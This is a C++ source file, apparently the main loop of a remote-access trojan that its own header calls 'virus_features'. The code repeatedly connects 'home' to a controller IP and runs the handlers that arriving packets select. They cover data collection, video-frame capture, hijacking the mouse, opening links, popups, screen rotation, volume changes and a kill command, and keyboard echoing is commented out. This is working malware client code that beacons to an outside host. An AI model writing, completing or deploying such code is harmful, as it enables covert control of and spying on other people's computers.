#include "virus_features.h"
#include "../../ip.h"

int main() {

    // Should be defined in the same order as packet_id enum this is badly designed but I do not care, this is a stupid project
    Get_data get_data_handle;
    Popup pop_up_handle;
    Open_link open_link_handle;
    tts tts_handle;
    curser_pos curser_pos_handle;
    random_mouse_move random_mouse_handle;
    invert_mouse mouse_invert_handle;
    lock_mouse_to_box lock_mouse_handle;
    free_mouse free_mouse_handle;
    get_video_frame video_frame_handle;
    // keyboard_type keyboard_type_handle;
    // echo_keyboard echo_keyboard_handle;
    dead_class dead1;
    dead_class dead2;
    rotate_screen rotate_screen_handle;
    system_volume system_volume_handle;
    kill kill_handle;

    while(true) {
        std::cout << "trying to connect to home\n";
        try {
            asio::io_context io_context;

            tcp::resolver resolver(io_context);
            auto endpoints = resolver.resolve(connect_to_ip, std::to_string(port));

            tcp::socket socket(io_context);
            asio::connect(socket, endpoints);
            std::cout << "connected to home yayayayayayayayyayay\n";

            while (true) {
                Packet packet;
                std::size_t len = asio::read(socket, asio::buffer(&packet, sizeof(Packet)));

                if (len != sizeof(Packet)) {
                    std::cerr << "Error: Incomplete packet received." << std::endl;
                }

                for(auto [id, handler] : Packet_Manager::Every_Package) {
                    if(packet.id == (packet_id)id) {
                        handler->receive(packet);
                        handler->send(socket, packet);
                    }
                }

            }

        } catch (std::exception& e) {
            std::cout << "failed to connect to home \n";
            std::cerr << "Exception: " << e.what() << "\n";
        }
    }
    return 0;
}
